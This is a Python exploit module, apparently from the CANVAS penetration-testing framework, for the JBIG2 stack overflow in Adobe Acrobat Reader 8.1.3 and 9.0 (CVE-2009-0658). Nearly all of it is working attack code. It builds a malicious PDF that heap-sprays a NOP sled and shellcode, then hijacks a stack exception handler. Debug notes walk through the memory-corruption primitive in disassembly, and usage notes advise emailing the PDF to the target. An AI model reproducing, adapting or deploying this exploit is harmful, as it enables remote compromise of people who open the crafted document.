##ImmunityHeader v1 
###############################################################################
## File       :  acrobat_jbig.py
## Description:  
##            :  
## Created_On :  Sun Jan  3 13:34:32 2010
## Created_By :  Justin Seitz
## Modified_On:  
## Modified_By:  
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import binascii
import math

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Adobe Acrobat Reader 9.0 JBIG Parser (Stack Overwrite)'
DESCRIPTION='Adobe Acrobat Reader 9.0 Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='02/20/2009'
DOCUMENTATION['References']='http://secunia.com/advisories/33901/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Adobe Acrobat Reader 9.0/8.1.3 and lower'
DOCUMENTATION['CVE Name']='CVE-2009-0658'
DOCUMENTATION['CVE URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0658'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION['CERT Advisory']="http://www.kb.cert.org/vuls/id/905281"
DOCUMENTATION['Notes']="""
Not to be used from IE (via the HTTP Server) as memory moves around too much.

Instead, generate a PDF file and email it to your target. 

This exploit requires at least 300mb of RAM on your target's machine for the
heap spray. It does not require JavaScript to be enabled in Acrobat Reader.
This was tested on Acrobat Reader 9.0 on XP SP2/3.
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

DEBUGNOTES="""
We're able to overwrite 4 bytes of memory (any address) without using javascript heap spraying.

We create a fake image that is decompressed to memory (about 100mb of data are compressed to only ~200kbytes) with the address that we want to overwrite divided by 5.
Address is constructed here:
|.  8B50 04                   |MOV EDX,DWORD PTR DS:[EAX+4]
|.  85D2                      |TEST EDX,EDX
|.  74 0A                     |JE SHORT AcroRd_1.00EDD788
|.  8B68 10                   |MOV EBP,DWORD PTR DS:[EAX+10]
|.  890CAA                    |MOV DWORD PTR DS:[EDX+EBP*4],ECX                    ;  OVERWRITE
|.  8340 10 01                |ADD DWORD PTR DS:[EAX+10],1                         ;  next DWORD
|.  83C7 01                   |ADD EDI,1
|.  3B7C24 1C                 |CMP EDI,DWORD PTR SS:[ESP+1C]                       ;  counter of segments
^ 72 D6                       JB SHORT AcroRd32.03D0DAD7

If we put more than one segment it will overwrite more DWORDs

EAX points to our heap spray.
ECX is an object, where we control some values (offsets 0x0,0x20,0x3C can be arbitrary values):
    Segment Object:
    0x0 - DWORD - seg number
    0x4 - BYTE - seg type
    0x6 - WORD - page association field size (bool, 1=4bytes)
    0x8 - WORD - Deferred non-retain (bool)
    0xC - BYTE - flags from referred-to
    0x10 - DWORD - Referred-to segment count (0 to 4 or 7 for long format values)
    0x14 - DWORD - PTR to allocated space for retain flags (referred-to)
    0x18 - DWORD - PTR to allocated space for segment numbers (size=refererd-to segment count * 4)
    0x1C - DWORD - segment page association
    0x20 - DWORD - segment data size
    0x28 - DWORD - PTR to user data
    0x2C - DWORD - PTR to next byte to decode
    0x30 - DWORD - ref counter (related to 0x34)
    0x34 - DWORD - PTR to allocated space used for references to this segment, saved the ptr to the orig seg obj (size=refererd-to segment count * 4)
    0x3C - DWORD - user controlled (only when seg type is 0x26)

JBIG segment format:
    0x0 - DWORD - segment number
    0x4 - BYTE - Segment Header flags
                 Bit 6 - Page association field size (1 - 4bytes)
                 Bits 0-5 - Segment Type
    0x5 - BYTE - Referred-to segment count and retention flags
    0x6 - DWORD - Segment Page association (BUG!)
    0xA - DWORD - Segment Data Size
    0xE - VARIABLE - Data

The exploit works overwriting an exception handler in the stack with the address to our segment object. First 4 bytes of this object are arbitrarily controlled by the user.
In our case we put:
04D3F6F0    8BC8            MOV ECX,EAX
04D3F6F2    FF11            CALL DWORD PTR DS:[ECX]

EAX is the address of our object, so it'll call the address constructed with this same 4 bytes (0x11FFC88B), which have our shellcode (that we put there using heap spray).

Exception handler inside AcroRd32.dll:
00FC5AC9      |.  8B75 00                   MOV ESI,DWORD PTR SS:[EBP]
00FC5ACC      |.  85F6                      TEST ESI,ESI
00FC5ACE      |.  A1 30694A01               MOV EAX,DWORD PTR DS:[14A6930]
00FC5AD3      |.  75 25                     JNZ SHORT AcroRd_1.00FC5AFA
...
00FC5B18      |> \8B46 04                   MOV EAX,DWORD PTR DS:[ESI+4]
00FC5B1B      |.  85C0                      TEST EAX,EAX
00FC5B1D      |.  74 0D                     JE SHORT AcroRd_1.00FC5B2C
00FC5B1F      |.  57                        PUSH EDI
00FC5B20      |.  53                        PUSH EBX
00FC5B21      |.  56                        PUSH ESI
00FC5B22      |.  FFD0                      CALL EAX                          ;Bingo!

"""

NOTES="""
TESTED ON:
Windows XP SP3/SP2 (DEP OptIn) using the standalone pdf file created (not from IE)

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/acrobat_jbig/acrobat_jbig.py -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)',0],
    1: ['Adobe Acrobat Reader 8.1.3 - Windows XP SP2/3',0],
    2: ['Adobe Acrobat Reader 9.0 - Windows XP SP2/3',0]
}

from canvasengine import WIN32MOSDEF
from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *
import copy

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME
        #self.pdffilename='file.pdf'
        #self.pdfdirectory='Resources/'
        self.source_pdf     = 'Resources/blank.pdf' #modified to be standard across all pdf exploits
        self.dest_pdf       = 'temp.pdf'
        self.version=2
        return

        
    def is_vulnerable(self, info_dict):
        """
        XXX: Notes say 'not to be used from ie!'
        Shouldn't this return 0?
        """
        return 0 #needs testing from IE!
    
        major, minor, build, patch = self.getReaderVersions(info_dict)

        if major == 9:
            if minor == 0:
                if build == 0:
                    return 100
                    
        if major == 8:
            if minor == 1:
                if build <= 3:
                    return 100
        return 0
    

    def makePDF_813(self):
        input=PdfFileReader(file(self.source_pdf,'rb'))
        
        page = input.getPage(0)
        page[NameObject("/MediaBox")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(500),NumberObject(300)))
        
        self.createSprayPage_813(page,address=0x0012F000, shellcode=self.createShellcode(), pagesize=0x100000, mempages=120, perc=0.8)
        page2=self.copy_page(page)
        self.createJBIGPage_813(page2, overwrite_counter=0x3ff)
        
        output=PdfFileWriter()
        output.addPage(page)
        output.addPage(page2)
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()

    def createJBIGPage_813(self, page, overwrite_counter):
        page[NameObject("/Resources")]=DictionaryObject()
        res = page["/Resources"].getObject()
        res[NameObject('/XObject')]=DictionaryObject()
        
        img=StreamObject()
        img[NameObject('/Filter')]=NameObject("/JBIG2Decode")
        img._data="\x0C\x10\x10\xFF\x40\x00\x00\x0C\x00\x05\x00\x00\x00\x01"+"A"
        #First 2 bytes are a CALL [EAX], EAX is equal to the address where this 2 bytes resides, which contents decode to address 0x0C1010FF
        img._data=img._data*overwrite_counter

        res["/XObject"][NameObject("/I0")]=img
        res["/XObject"]["/I0"][NameObject('/Type')]=NameObject("/XObject")
        res["/XObject"]["/I0"][NameObject('/BitsPerComponent')]=NumberObject(1)
        res["/XObject"]["/I0"][NameObject('/Height')]=NumberObject(50)
        res["/XObject"]["/I0"][NameObject('/Width')]=NumberObject(50)
        res["/XObject"]["/I0"][NameObject('/Subtype')]=NameObject("/Image")
        res["/XObject"]["/I0"][NameObject('/ColorSpace')]=NameObject("/DeviceGray")
    
        page[NameObject("/Contents")]=DecodedStreamObject()
        page["/Contents"].setData("""
    q
    1 0 0 1 1 1 cm
    50 0 0 50 0 0 cm
    /I0 Do
    Q
        """)

    def createSprayPage_813(self, page, address, shellcode, pagesize, mempages, perc):
        """
        last part (after perc*mempages) of heap spray is a NOPsled with shellcode at the end.
        Each page is 0x1000000 bytes long.
        """
        
        page[NameObject("/Resources")]=DictionaryObject()
        res = page["/Resources"].getObject()
        res[NameObject('/XObject')]=DictionaryObject()
        
        addr1=int(address/5)
        addr2=int(address/5)+(address - (addr1*5))
        page[NameObject("/Contents")]=DecodedStreamObject()
        
        h=w=int(math.sqrt(pagesize))
        totalsize = h*w
        
        img=StreamObject()
        img._data=struct.pack("<L",addr1)+struct.pack("<L",addr2)
        img._data=img._data*(totalsize/len(img._data))
        
        img2=StreamObject()
        img2._data="\x90"*(int(totalsize*0.9)-len(shellcode))+shellcode+"\x90"*int(totalsize*0.1)
        
        cont=""
        for x in range(0,mempages):
            pos1=(x%50)*10
            pos2=200-(int(x/50))*10
            cont+="q\n1 0 0 1 %d %d cm\n10 0 0 10 0 0 cm\n/SPRAY%d Do\nQ\n"%(pos1,pos2,x)
            
            if x < (mempages*perc): #perc of heap spray that is address, the rest is shellcode
                res["/XObject"][NameObject("/SPRAY%d"%x)]=img.flateEncode()
            else:
                res["/XObject"][NameObject("/SPRAY%d"%x)]=img2.flateEncode()
            
            res["/XObject"]["/SPRAY%d"%x]._data=self.RLEncode(res["/XObject"]["/SPRAY%d"%x]._data)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Filter')]=ArrayObject((NameObject("/RunLengthDecode"),NameObject("/FlateDecode")))
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Type')]=NameObject("/XObject")
            res["/XObject"]["/SPRAY%d"%x][NameObject('/BitsPerComponent')]=NumberObject(8)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Height')]=NumberObject(h)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Width')]=NumberObject(w)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Subtype')]=NameObject("/Image")
            res["/XObject"]["/SPRAY%d"%x][NameObject('/ColorSpace')]=NameObject("/DeviceGray")
        
        page["/Contents"].setData(cont)
        
    def makePDF_90(self):
        input=PdfFileReader(file(self.source_pdf,'rb'))
        
        page = input.getPage(0)
        page[NameObject("/MediaBox")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(300),NumberObject(800)))
        
        self.createSprayPage_90(page,address=0x0012F000, shellcode=self.createShellcode(), mempages=13, perc=0.5)
        page2=self.copy_page(page)
        self.createJBIGPage_90(page2, overwrite_counter=0x3ff)
        
        output=PdfFileWriter()
        output.addPage(page)
        output.addPage(page)
        output.addPage(page2)
        root=output._root.getObject()
        root.update({NameObject('/PageLayout'):NameObject("/TwoColumnLeft"),
                     NameObject('/PageMode'):NameObject('/UseThumbs'),
                     })
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()
        
    def createJBIGPage_90(self, page, overwrite_counter):
        page[NameObject("/Resources")]=DictionaryObject()
        res = page["/Resources"].getObject()
        res[NameObject('/XObject')]=DictionaryObject()
        
        img=StreamObject()
        img[NameObject('/Filter')]=NameObject("/JBIG2Decode")
        img._data="\x12\x40\x10\xFF\x40\x00\x00\x66\x66\x66\x00\x00\x00\x01"+"A"
        #First 2 bytes are a CALL [EAX], EAX is equal to the address where this 2 bytes resides, which contents decode to address 0x124010FF
        img._data=img._data*overwrite_counter
        
        res["/XObject"][NameObject("/I0")]=img
        res["/XObject"]["/I0"][NameObject('/Type')]=NameObject("/XObject")
        res["/XObject"]["/I0"][NameObject('/BitsPerComponent')]=NumberObject(1)
        res["/XObject"]["/I0"][NameObject('/Height')]=NumberObject(50)
        res["/XObject"]["/I0"][NameObject('/Width')]=NumberObject(50)
        res["/XObject"]["/I0"][NameObject('/Subtype')]=NameObject("/Image")
        res["/XObject"]["/I0"][NameObject('/ColorSpace')]=NameObject("/DeviceGray")
        
        page[NameObject("/Contents")]=DecodedStreamObject()
        page["/Contents"].setData("""
    q
    1 0 0 1 1 1 cm
    50 0 0 50 0 0 cm
    /I0 Do
    Q
        """)
    
    def RLEncode(self, input_string):
        count = 1
        prev = ''
        lst = []
        for character in input_string:
            if character != prev:
                if prev:
                    entry = (prev,count)
                    lst.append(entry)
                    #print lst
                count = 1
                prev = character
            elif character == prev:
                count += 1
        else:
            entry = (character,count)
            lst.append(entry)
        
        #transform to a PS RLE string
        out=""
        lastones=""
        for entry in lst:
            if entry[1] == 1:
                if len(lastones) < 128:
                    lastones += entry[0]
                else:
                    out += chr(len(lastones)-1) + lastones
                    lastones = entry[0]
            else:
                if len(lastones):
                    out += chr(len(lastones)-1) + lastones
                    lastones = ""
                c=entry[1]
                while c > 0:
                    if c > 128:
                        out += chr(257 - 128) + entry[0]
                        c -= 128
                    elif c > 1:
                        out += chr(257 - c) + entry[0]
                        c = 0
                    else:
                        lastones += entry[0]
                        c = 0
        if len(lastones):
            out += chr(len(lastones)-1) + lastones
        out += chr(0x80)
        
        return out

    def createSprayPage_90(self, page, address, shellcode, mempages, perc):
        """
        last part (after perc*mempages) of heap spray is a NOPsled with shellcode at the end.
        Each page is 0x1000000 bytes long.
        """
        
        page[NameObject("/Resources")]=DictionaryObject()
        res = page["/Resources"].getObject()
        res[NameObject('/XObject')]=DictionaryObject()
        
        addr1=int(address/5)
        addr2=int(address/5)+(address - (addr1*5))
        page[NameObject("/Contents")]=DecodedStreamObject()
        
        w=0x1000
        h=0xfff
        totalsize = w*h
        
        img=StreamObject()
        img._data=struct.pack("<L",addr1)+struct.pack("<L",addr2)
        img._data=img._data*(totalsize/len(img._data))
        
        img2=StreamObject()
        img2._data="\x90"*(totalsize-0x3000-len(shellcode))+shellcode+"\x90"*0x3000
        
        cont=""
        for x in range(0,mempages):
            pos1=(x%300)
            pos2=700-(int(x/300))
            cont+="q\n1 0 0 1 %d %d cm\n/SPRAY%d Do\nQ\n"%(pos1,pos2,x)
            
            if x < (mempages*perc): #perc of heap spray that is address, the rest is shellcode
                res["/XObject"][NameObject("/SPRAY%d"%x)]=img.flateEncode()
            else:
                res["/XObject"][NameObject("/SPRAY%d"%x)]=img2.flateEncode()
            
            res["/XObject"]["/SPRAY%d"%x]._data=self.RLEncode(res["/XObject"]["/SPRAY%d"%x]._data)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Filter')]=ArrayObject((NameObject("/RunLengthDecode"),NameObject("/FlateDecode")))
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Type')]=NameObject("/XObject")
            res["/XObject"]["/SPRAY%d"%x][NameObject('/BitsPerComponent')]=NumberObject(8)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Height')]=NumberObject(h)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Width')]=NumberObject(w)
            res["/XObject"]["/SPRAY%d"%x][NameObject('/Subtype')]=NameObject("/Image")
            res["/XObject"]["/SPRAY%d"%x][NameObject('/ColorSpace')]=NameObject("/DeviceGray")
        
        page["/Contents"].setData(cont)
        
    def copy_page(self, page):
        p = PageObject(page)
        p.update(page)
        p.mediaBox = copy.copy(page.mediaBox)
        return p
    
    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename',self.dest_pdf)
        self.version=self.argsDict.get('version',self.version)
        return
    
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return
    
    def run(self):
        self.getArgs()
        if self.version == 1:
            self.log('Creating malicious PDF for Acrobat Reader 8.1.3')
            self.filedata=self.makePDF_813()
        elif self.version == 2:
            self.log('Creating malicious PDF for Acrobat Reader 9.0')
            self.filedata=self.makePDF_90()
        else:
            self.log('Autodetect is not available on this module')
            return 0
        
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
